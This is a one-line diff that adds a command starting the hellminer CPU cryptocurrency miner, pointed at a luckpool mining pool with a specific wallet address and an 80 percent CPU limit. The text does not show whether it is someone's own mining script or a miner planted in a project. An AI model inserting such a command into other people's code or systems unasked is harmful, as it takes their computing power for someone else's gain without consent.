@@ -1,0 +1,1 @@
+./hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RKwQX3o2J7cDK2CJPxrtkfuUwCe7nHVr5c.alert -p x --cpu 80
